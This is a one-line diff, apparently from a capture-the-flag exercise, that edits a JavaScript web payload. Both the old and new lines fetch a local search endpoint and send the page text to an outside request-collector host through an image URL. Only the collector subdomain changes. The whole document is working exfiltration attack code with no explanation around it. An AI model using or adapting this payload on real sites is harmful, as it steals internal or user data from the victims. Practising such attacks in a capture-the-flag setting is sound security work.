@@ -1,1 +1,1 @@
-fetch("http://127.0.0.1:12001/search?query=scpCTF").then(function(res){return res.text()}).then(function(text){new Image().src="https://bfgtjrh.request.dreamhack.games/?data="+encodeURIComponent(text)});
+fetch("http://127.0.0.1:12001/search?query=scpCTF").then(function(res){return res.text()}).then(function(text){new Image().src="https://sszhpvg.request.dreamhack.games/?data="+encodeURIComponent(text)});
